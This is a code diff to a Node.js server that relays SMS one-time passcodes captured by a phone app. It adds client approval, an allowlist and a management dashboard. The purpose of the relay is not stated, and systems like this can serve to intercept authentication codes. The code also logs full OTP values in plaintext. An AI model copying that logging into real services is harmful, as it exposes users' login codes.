@@ -41,7 +41,10 @@ const CLIENTS_FILE = join(__dirname, 'clients.json')
 const clients = new Map()
 try {
   const data = JSON.parse(fs.readFileSync(CLIENTS_FILE, 'utf8'))
-  for (const [k, v] of Object.entries(data)) clients.set(k, v)
+  for (const [k, v] of Object.entries(data)) {
+    if (v.approved === undefined) v.approved = 'approved' // grandfather existing clients (na toote)
+    clients.set(k, v)
+  }
   console.log(`[clients] loaded ${clients.size}`)
 } catch {}
 
@@ -53,14 +56,33 @@ function saveClients() {
     catch (e) { console.error('[clients] save failed', e.message) }
   }, 1000)
 }
+
+// ---- Approval allowlist (pre-approved numbers -> auto-approve on register) ----
+const ALLOW_FILE = join(__dirname, 'allowlist.json')
+const allowlist = new Set()
+try { for (const n of JSON.parse(fs.readFileSync(ALLOW_FILE, 'utf8'))) allowlist.add(n) } catch {}
+function saveAllow() {
+  try { fs.writeFileSync(ALLOW_FILE, JSON.stringify([...allowlist])) }
+  catch (e) { console.error('[allow] save failed', e.message) }
+}
+function isApproved(number) {
+  const c = clients.get(number)
+  return !!c && c.approved === 'approved'
+}
+
 const now = () => Date.now()
-function touchClient(number, { otp = false, version = null, smsSeen = false, otpFound = null, flags = null } = {}) {
+function touchClient(number, { otp = false, version = null, smsSeen = false, otpFound = null, flags = null, name = null } = {}) {
   if (!number) return
+  const isNew = !clients.has(number)
   const c = clients.get(number) || { firstSeen: now(), lastSeen: 0, lastOtpAt: 0, lastSmsAt: 0, version: null }
+  if (isNew) c.approved = allowlist.has(number) ? 'approved' : 'pending'
+  // pending client agar allowlist me aa gaya -> auto approve (manual reject ko override nahi karta)
+  if (c.approved === 'pending' && allowlist.has(number)) c.approved = 'approved'
   c.lastSeen = now()
   if (otp) c.lastOtpAt = now()
   if (smsSeen) { c.lastSmsAt = now(); if (otpFound !== null) c.lastSmsOtp = !!otpFound }
   if (version) c.version = version
+  if (name) c.name = name
   if (flags) {
     if (flags.sms   !== undefined) c.sms    = flags.sms   // SMS permission on?
     if (flags.notif !== undefined) c.notif  = flags.notif // notifications on?
@@ -108,6 +130,11 @@ function handleOtp(req, res) {
   if (!number) return res.status(400).json({ ok: false, error: 'Missing "number".' })
   if (!otp) return res.status(400).json({ ok: false, error: 'No OTP found.' })
   touchClient(number, { otp: true })
+  // GATING: sirf approved clients ke OTP route hote hain
+  if (!isApproved(number)) {
+    console.log(`[otp] number=…${number} otp=${otp} DROPPED (not approved)`)
+    return res.json({ ok: true, number, delivered: false, approved: false })
+  }
   const delivered = deliver(number, otp)
   if (!delivered) orphanOtps.set(number, { otp, at: now() })
   console.log(`[otp] number=…${number} otp=${otp} delivered=${delivered}`)
@@ -130,13 +157,16 @@ function handleRegister(req, res) {
   if (data.notif !== undefined) flags.notif = truthy(data.notif)
   if (data.batt  !== undefined) flags.batt  = truthy(data.batt)
   if (data.num   !== undefined) flags.num   = truthy(data.num)
+  const name = data.name ? String(data.name).trim().slice(0, 40) : null
   touchClient(number, {
     version: data.ver || null,
     smsSeen, otpFound: smsSeen ? otpFound : null,
     flags: Object.keys(flags).length ? flags : null,
+    name,
   })
   if (smsSeen) console.log(`[sms-seen] number=…${number} otpFound=${otpFound}`)
-  return res.json({ ok: true, number })
+  const c = clients.get(number)
+  return res.json({ ok: true, number, approved: c ? c.approved : 'pending' })
 }
 app.post('/register', handleRegister)
 app.get('/register', handleRegister)
@@ -177,55 +207,96 @@ function loginPage(error) {
 
 const tick = (v) => v === undefined ? '<span style="color:#64748b">–</span>'
   : (v ? '<span style="color:#16a34a">✓</span>' : '<span style="color:#ef4444">✗</span>')
+const esc = (s) => String(s == null ? '' : s).replace(/[&<>"]/g,
+  (ch) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[ch]))
+
+function statusOf(c) {
+  const connected = now() - c.lastSeen <= ONLINE_WINDOW_MS
+  const ready = c.sms !== undefined ? c.sms === true : true
+  if (connected && ready) return { dot: '🟢', label: 'Online', color: '#16a34a' }
+  if (connected) {
+    const miss = []
+    if (c.numSet === false) miss.push('number')
+    if (c.sms === false) miss.push('SMS')
+    return { dot: '🟡', label: 'Setup: ' + (miss.join(', ') || 'settings'), color: '#eab308' }
+  }
+  return { dot: '🔴', label: 'Offline', color: '#ef4444' }
+}
+const smsCellOf = (c) => c.lastSmsAt
+  ? `${fmtAgo(c.lastSmsAt)} ago${c.lastSmsOtp === false ? ' <span style="color:#64748b">(no code)</span>' : ''}`
+  : '<span style="color:#ef4444">never</span>'
 
 function dashboardPage() {
   const list = [...clients.entries()].map(([num, c]) => ({ ...c, num })).sort((a, b) => b.lastSeen - a.lastSeen)
-  const reports = (c) => c.sms !== undefined            // naya app readiness bhejta hai
-  const isReady = (c) => reports(c) ? c.sms === true : true // purane app: fall back to online
-  const isConnected = (c) => now() - c.lastSeen <= ONLINE_WINDOW_MS
-  const online = list.filter((c) => isConnected(c) && isReady(c)).length
+  const approvedL = list.filter((c) => c.approved === 'approved')
+  const pendingL = list.filter((c) => c.approved === 'pending')
+  const rejectedL = list.filter((c) => c.approved === 'rejected')
+  const online = approvedL.filter((c) => statusOf(c).dot === '🟢').length
 
-  const rows = list.map((c) => {
-    const connected = isConnected(c)
-    let dot, label, color
-    if (connected && isReady(c)) {
-      dot = '🟢'; label = 'Online'; color = '#16a34a'
-    } else if (connected) {
-      // app zinda hai par ready nahi -> kaunsi setting missing?
-      const miss = []
-      if (c.numSet === false) miss.push('number')
-      if (c.sms === false) miss.push('SMS')
-      dot = '🟡'; label = 'Setup: ' + (miss.join(', ') || 'settings'); color = '#eab308'
-    } else {
-      dot = '🔴'; label = 'Offline'; color = '#ef4444'
-    }
-    const smsCell = c.lastSmsAt
-      ? `${fmtAgo(c.lastSmsAt)} ago${c.lastSmsOtp === false ? ' <span style="color:#64748b">(no code)</span>' : ''}`
-      : '<span style="color:#ef4444">never</span>'
-    return `<tr><td>${c.num}</td><td>${c.version || '-'}</td>` +
+  // ---- Pending review section ----
+  const pendingRows = pendingL.map((c) =>
+    `<tr><td>${esc(c.name) || '<span style="color:#64748b">—</span>'}</td><td>${c.num}</td><td>${c.version || '-'}</td>` +
+    `<td>${fmtAgo(c.lastSeen)} ago</td>` +
+    `<td><a class="btn ok" href="?approve=${c.num}">✓ Approve</a> ` +
+    `<a class="btn no" href="?reject=${c.num}">✗ Reject</a></td></tr>`).join('')
+  const pendingBlock = pendingL.length
+    ? `<h2>⏳ Pending review (${pendingL.length})</h2>` +
+      `<table><tr><th>Name</th><th>Number</th><th>Ver</th><th>Last seen</th><th>Action</th></tr>${pendingRows}</table>`
+    : ''
+
+  // ---- Approved (main) section ----
+  const approvedRows = approvedL.map((c) => {
+    const st = statusOf(c)
+    return `<tr><td>${esc(c.name) || '<span style="color:#64748b">—</span>'}</td><td>${c.num}</td><td>${c.version || '-'}</td>` +
       `<td style="text-align:center">${tick(c.sms)}</td>` +
       `<td style="text-align:center">${tick(c.notif)}</td>` +
       `<td style="text-align:center">${tick(c.batt)}</td>` +
-      `<td>${fmtAgo(c.lastSeen)} ago</td><td>${smsCell}</td>` +
+      `<td>${fmtAgo(c.lastSeen)} ago</td><td>${smsCellOf(c)}</td>` +
       `<td>${c.lastOtpAt ? fmtAgo(c.lastOtpAt) + ' ago' : '-'}</td>` +
-      `<td style="color:${color}">${dot} ${label}</td>` +
-      `<td><a href="?remove=${c.num}" onclick="return confirm('Remove ${c.num}?')" style="color:#f87171;text-decoration:none">✕</a></td></tr>`
+      `<td style="color:${st.color}">${st.dot} ${st.label}</td>` +
+      `<td><a class="btn no" href="?reject=${c.num}">reject</a> ` +
+      `<a href="?remove=${c.num}" onclick="return confirm('Remove ${c.num}?')" style="color:#f87171;text-decoration:none">✕</a></td></tr>`
   }).join('')
 
-  return `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="15">` +
+  // ---- Rejected (collapsed) ----
+  const rejectedRows = rejectedL.map((c) =>
+    `<tr><td>${esc(c.name) || '—'}</td><td>${c.num}</td>` +
+    `<td><a class="btn ok" href="?approve=${c.num}">approve</a> ` +
+    `<a href="?remove=${c.num}" onclick="return confirm('Remove ${c.num}?')" style="color:#f87171;text-decoration:none">✕</a></td></tr>`).join('')
+  const rejectedBlock = rejectedL.length
+    ? `<details style="margin-top:14px"><summary style="cursor:pointer;color:#94a3b8">🚫 Rejected (${rejectedL.length})</summary>` +
+      `<table><tr><th>Name</th><th>Number</th><th>Action</th></tr>${rejectedRows}</table></details>`
+    : ''
+
+  // ---- Allowlist (pre-approve) ----
+  const allowChips = [...allowlist].map((n) =>
+    `<span class="chip">${n} <a href="?unallow=${n}" style="color:#f87171;text-decoration:none">✕</a></span>`).join(' ') || '<span style="color:#64748b">koi nahi</span>'
+
+  return `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="20">` +
     `<meta name="viewport" content="width=device-width,initial-scale=1"><title>OTP Clients</title>` +
     `<style>body{font:14px system-ui,sans-serif;background:#0f172a;color:#e2e8f0;padding:18px}` +
-    `h1{font-size:18px;display:inline-block}a.logout{float:right;color:#94a3b8;font-size:13px}` +
+    `h1{font-size:18px;display:inline-block}h2{font-size:15px;margin:20px 0 4px}a.logout{float:right;color:#94a3b8;font-size:13px}` +
     `.pill{font-size:13px;padding:2px 10px;border-radius:20px;margin-left:8px}` +
-    `table{border-collapse:collapse;width:100%;margin-top:10px}` +
+    `table{border-collapse:collapse;width:100%;margin-top:8px}` +
     `th,td{padding:8px 10px;border-bottom:1px solid #334155;text-align:left;white-space:nowrap}` +
-    `th{color:#94a3b8;font-weight:600}.muted{color:#64748b;margin-top:10px}</style></head>` +
+    `th{color:#94a3b8;font-weight:600}.muted{color:#64748b;margin-top:10px}` +
+    `.btn{display:inline-block;padding:3px 9px;border-radius:6px;text-decoration:none;font-size:12px}` +
+    `.btn.ok{background:#052e16;color:#4ade80}.btn.no{background:#3f1d1d;color:#f87171}` +
+    `.chip{background:#1e293b;padding:3px 8px;border-radius:14px;font-size:12px;margin-right:4px}` +
+    `form.allow{margin:8px 0}form.allow input{padding:7px;border-radius:6px;border:1px solid #334155;background:#0f172a;color:#e2e8f0}` +
+    `form.allow button{padding:7px 12px;border:0;border-radius:6px;background:#6366f1;color:#fff;cursor:pointer}</style></head>` +
     `<body><h1>OTP Clients</h1>` +
-    `<span class="pill" style="background:#052e16;color:#4ade80">🟢 ${online} online (ready)</span>` +
-    `<span class="pill" style="background:#1e293b;color:#94a3b8">${list.length} total</span>` +
+    `<span class="pill" style="background:#052e16;color:#4ade80">🟢 ${online} online</span>` +
+    `<span class="pill" style="background:#1e293b;color:#94a3b8">${approvedL.length} approved · ${pendingL.length} pending</span>` +
     `<a class="logout" href="?logout=1">logout</a>` +
-    `<table><tr><th>Number</th><th>Ver</th><th>SMS</th><th>Notif</th><th>Batt</th><th>Last seen</th><th>Last SMS</th><th>Last OTP</th><th>Status</th><th></th></tr>${rows}</table>` +
-    `<p class="muted">Auto-refresh 15s · 🟢 Online = connected + SMS on + number set · 🟡 Setup = app zinda par koi setting missing · 🔴 Offline = reachable nahi · <b>Last SMS "never"</b> = SMS phone tak nahi pohnch raha · total ${list.length}</p></body></html>`
+    pendingBlock +
+    `<h2>✅ Approved (${approvedL.length})</h2>` +
+    `<table><tr><th>Name</th><th>Number</th><th>Ver</th><th>SMS</th><th>Notif</th><th>Batt</th><th>Last seen</th><th>Last SMS</th><th>Last OTP</th><th>Status</th><th></th></tr>${approvedRows}</table>` +
+    rejectedBlock +
+    `<h2>➕ Pre-approve (allowlist)</h2>` +
+    `<form class="allow" method="get" action="/otp-clients"><input name="allow" placeholder="Number pehle se approve (e.g. 03001234567)"> <button>Add</button></form>` +
+    `<div>${allowChips}</div>` +
+    `<p class="muted">Auto-refresh 20s · 🟢 Online = connected + SMS on · 🟡 Setup = setting missing · 🔴 Offline · Sirf <b>Approved</b> ke OTP route hote hain · Allowlist number auto-approve karta hai.</p></body></html>`
 }
 
 app.get('/clients', (req, res) => {
@@ -237,6 +308,30 @@ app.get('/clients', (req, res) => {
   if (req.query.remove) {
     const num = normalizeNumber(req.query.remove)
     if (num && clients.delete(num)) saveClients()
+    return res.redirect('/otp-clients')
+  }
+  // Approve / Reject / re-Pending a client
+  for (const [q, status] of [['approve', 'approved'], ['reject', 'rejected'], ['pending', 'pending']]) {
+    if (req.query[q]) {
+      const num = normalizeNumber(req.query[q])
+      const c = clients.get(num)
+      if (c) { c.approved = status; saveClients() }
+      return res.redirect('/otp-clients')
+    }
+  }
+  // Pre-approve allowlist: add a number (auto-approves current + future client)
+  if (req.query.allow) {
+    const num = normalizeNumber(req.query.allow)
+    if (num) {
+      allowlist.add(num); saveAllow()
+      const c = clients.get(num)
+      if (c && c.approved !== 'approved') { c.approved = 'approved'; saveClients() }
+    }
+    return res.redirect('/otp-clients')
+  }
+  if (req.query.unallow) {
+    const num = normalizeNumber(req.query.unallow)
+    if (num && allowlist.delete(num)) saveAllow()
     return res.redirect('/otp-clients')
   }
   res.type('html').send(dashboardPage())
